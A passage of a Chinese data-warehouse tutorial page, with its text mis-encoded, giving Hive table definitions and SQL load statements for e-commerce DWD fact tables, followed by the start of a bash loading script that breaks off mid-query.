id="æµé‡åŸŸæ›å…‰äº‹åŠ¡äº‹å®è¡¨"><a href="#æµé‡åŸŸæ›å…‰äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="æµé‡åŸŸæ›å…‰äº‹åŠ¡äº‹å®è¡¨"></a>æµé‡åŸŸæ›å…‰äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_display_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_display_inc</p><p>(</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`brand` STRING COMMENT â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`is_new` STRING COMMENT â€˜æ˜¯å¦é¦–æ¬¡å¯åŠ¨â€™,</p><p>`model` STRING COMMENT â€˜æ‰‹æœºå‹å·â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`operate_system` STRING COMMENT â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`user_id` STRING COMMENT â€˜ä¼šå‘˜idâ€™,</p><p>`version_code` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`during_time` BIGINT COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`page_item` STRING COMMENT â€˜ç›®æ ‡id â€˜,</p><p>`page_item_type` STRING COMMENT â€˜ç›®æ ‡ç±»å‹â€™,</p><p>`last_page_id` STRING COMMENT â€˜ä¸Šé¡µç±»å‹â€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢ID â€˜,</p><p>`source_type` STRING COMMENT â€˜æ¥æºç±»å‹â€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`display_time` STRING COMMENT â€˜æ›å…‰æ—¶é—´â€™,</p><p>`display_type` STRING COMMENT â€˜æ›å…‰ç±»å‹â€™,</p><p>`display_item` STRING COMMENT â€˜æ›å…‰å¯¹è±¡id â€˜,</p><p>`display_item_type` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`display_order` BIGINT COMMENT â€˜æ›å…‰é¡ºåºâ€™,</p><p>`display_pos_id` BIGINT COMMENT â€˜æ›å…‰ä½ç½®â€™</p><p>) COMMENT â€˜æ›å…‰æ—¥å¿—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_traffic_display_incâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>set hive.cbo.enable=false;</p><p>insert overwrite table dwd_traffic_display_inc partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.`order` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=â€™2020-06-14â€™</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="æµé‡åŸŸé”™è¯¯äº‹åŠ¡äº‹å®è¡¨"><a href="#æµé‡åŸŸé”™è¯¯äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="æµé‡åŸŸé”™è¯¯äº‹åŠ¡äº‹å®è¡¨"></a>æµé‡åŸŸé”™è¯¯äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_traffic_error_inc;</p><p>CREATE EXTERNAL TABLE dwd_traffic_error_inc</p><p>(</p><p>`province_id` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`brand` STRING COMMENT â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`channel` STRING COMMENT â€˜æ¸ é“â€™,</p><p>`is_new` STRING COMMENT â€˜æ˜¯å¦é¦–æ¬¡å¯åŠ¨â€™,</p><p>`model` STRING COMMENT â€˜æ‰‹æœºå‹å·â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`operate_system` STRING COMMENT â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`user_id` STRING COMMENT â€˜ä¼šå‘˜idâ€™,</p><p>`version_code` STRING COMMENT â€˜appç‰ˆæœ¬å·â€™,</p><p>`page_item` STRING COMMENT â€˜ç›®æ ‡id â€˜,</p><p>`page_item_type` STRING COMMENT â€˜ç›®æ ‡ç±»å‹â€™,</p><p>`last_page_id` STRING COMMENT â€˜ä¸Šé¡µç±»å‹â€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢ID â€˜,</p><p>`source_type` STRING COMMENT â€˜æ¥æºç±»å‹â€™,</p><p>`entry` STRING COMMENT â€˜iconæ‰‹æœºå›¾æ ‡ notice é€šçŸ¥â€™,</p><p>`loading_time` STRING COMMENT â€˜å¯åŠ¨åŠ è½½æ—¶é—´â€™,</p><p>`open_ad_id` STRING COMMENT â€˜å¹¿å‘Šé¡µID â€˜,</p><p>`open_ad_ms` STRING COMMENT â€˜å¹¿å‘Šæ€»å…±æ’­æ”¾æ—¶é—´â€™,</p><p>`open_ad_skip_ms` STRING COMMENT â€˜ç”¨æˆ·è·³è¿‡å¹¿å‘Šæ—¶ç‚¹â€™,</p><p>`actions`<br>ARRAY&lt;STRUCT&lt;action_id:STRING,item:STRING,item_type:STRING,ts:BIGINT&gt;&gt;<br>COMMENT â€˜åŠ¨ä½œä¿¡æ¯â€™,</p><p>`displays` ARRAY&lt;STRUCT&lt;display_type :STRING,item :STRING,item_type<br>:STRING,`order` :STRING,pos_id</p><p>:STRING&gt;&gt; COMMENT â€˜æ›å…‰ä¿¡æ¯â€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸidâ€™,</p><p>`error_time` STRING COMMENT â€˜é”™è¯¯æ—¶é—´â€™,</p><p>`error_code` STRING COMMENT â€˜é”™è¯¯ç â€™,</p><p>`error_msg` STRING COMMENT â€˜é”™è¯¯ä¿¡æ¯â€™</p><p>) COMMENT â€˜é”™è¯¯æ—¥å¿—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_traffic_error_incâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table dwd_traffic_error_inc partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>`start`.entry,</p><p>`start`.loading_time,</p><p>`start`.open_ad_id,</p><p>`start`.open_ad_ms,</p><p>`start`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and err is not null</p><p>)log</p><p>join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="ç”¨æˆ·åŸŸç”¨æˆ·æ³¨å†Œäº‹åŠ¡äº‹å®è¡¨"><a href="#ç”¨æˆ·åŸŸç”¨æˆ·æ³¨å†Œäº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="ç”¨æˆ·åŸŸç”¨æˆ·æ³¨å†Œäº‹åŠ¡äº‹å®è¡¨"></a>ç”¨æˆ·åŸŸç”¨æˆ·æ³¨å†Œäº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_user_register_inc;</p><p>CREATE EXTERNAL TABLE dwd_user_register_inc</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·IDâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`create_time` STRING COMMENT â€˜æ³¨å†Œæ—¶é—´â€™,</p><p>`channel` STRING COMMENT â€˜åº”ç”¨ä¸‹è½½æ¸ é“â€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`version_code` STRING COMMENT â€˜åº”ç”¨ç‰ˆæœ¬â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`brand` STRING COMMENT â€˜è®¾å¤‡å“ç‰Œâ€™,</p><p>`model` STRING COMMENT â€˜è®¾å¤‡å‹å·â€™,</p><p>`operate_system` STRING COMMENT â€˜è®¾å¤‡æ“ä½œç³»ç»Ÿâ€™</p><p>) COMMENT â€˜ç”¨æˆ·åŸŸç”¨æˆ·æ³¨å†Œäº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_user_register_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_user_register_inc partition(dt)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ods_user_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and page.page_id=â€™registerâ€™</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_user_register_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ods_user_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™insertâ€™</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and page.page_id=â€™registerâ€™</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-15â€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><h3 id="ç”¨æˆ·åŸŸç”¨æˆ·ç™»å½•äº‹åŠ¡äº‹å®è¡¨"><a href="#ç”¨æˆ·åŸŸç”¨æˆ·ç™»å½•äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="ç”¨æˆ·åŸŸç”¨æˆ·ç™»å½•äº‹åŠ¡äº‹å®è¡¨"></a>ç”¨æˆ·åŸŸç”¨æˆ·ç™»å½•äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_user_login_inc;</p><p>CREATE EXTERNAL TABLE dwd_user_login_inc</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·IDâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`login_time` STRING COMMENT â€˜ç™»å½•æ—¶é—´â€™,</p><p>`channel` STRING COMMENT â€˜åº”ç”¨ä¸‹è½½æ¸ é“â€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`version_code` STRING COMMENT â€˜åº”ç”¨ç‰ˆæœ¬â€™,</p><p>`mid_id` STRING COMMENT â€˜è®¾å¤‡idâ€™,</p><p>`brand` STRING COMMENT â€˜è®¾å¤‡å“ç‰Œâ€™,</p><p>`model` STRING COMMENT â€˜è®¾å¤‡å‹å·â€™,</p><p>`operate_system` STRING COMMENT â€˜è®¾å¤‡æ“ä½œç³»ç»Ÿâ€™</p><p>) COMMENT â€˜ç”¨æˆ·åŸŸç”¨æˆ·ç™»å½•äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_user_login_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dwd_user_login_inc partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ods_log_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ods_base_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><h3 id="æ•°æ®è£…è½½è„šæœ¬-2"><a href="#æ•°æ®è£…è½½è„šæœ¬-2" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h3><h4 id="é¦–æ—¥è£…è½½è„šæœ¬-1"><a href="#é¦–æ—¥è£…è½½è„šæœ¬-1" class="headerlink" title="é¦–æ—¥è£…è½½è„šæœ¬"></a>é¦–æ—¥è£…è½½è„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºods_to_dwd_init.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dwd_init.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>echo â€œè¯·ä¼ å…¥æ—¥æœŸå‚æ•°â€</p><p>exit</p><p>fi</p><p>dwd_interaction_comment_inc=â€</p><p>insert overwrite table ${APP}.dwd_interaction_comment_inc partition(dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ${APP}.ods_comment_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™12â€™</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p>â€œ</p><p>dwd_interaction_favor_add_inc=â€</p><p>insert overwrite table ${APP}.dwd_interaction_favor_add_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.create_time,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™)</p><p>from ${APP}.ods_favor_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™;</p><p>â€œ</p><p>dwd_tool_coupon_get_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_get_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.get_time,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™;</p><p>â€œ</p><p>dwd_tool_coupon_order_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_order_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.using_time,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.using_time is not null;</p><p>â€œ</p><p>dwd_tool_coupon_pay_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_pay_inc partition(dt)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.used_time,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™)</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.used_time is not null;</p><p>â€œ</p><p>dwd_trade_cancel_detail_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_cancel_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>and data.order_status=â€™1003â€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_cart_add_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_cart_add_inc partition (dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic.dic_name,</p><p>sku_num,</p><p>date_format(create_time, â€˜yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num</p><p>from ${APP}.ods_cart_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on ci.source_type=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_cart_full=â€</p><p>insert overwrite table ${APP}.dwd_trade_cart_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ${APP}.ods_cart_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>and is_ordered=â€™0â€™;</p><p>â€œ</p><p>dwd_trade_order_detail_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_order_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(create_time, â€˜yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_order_refund_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_order_refund_inc partition(dt)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code = â€˜15â€™</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code = â€˜13â€™</p><p>)reason_dic</p><p>on 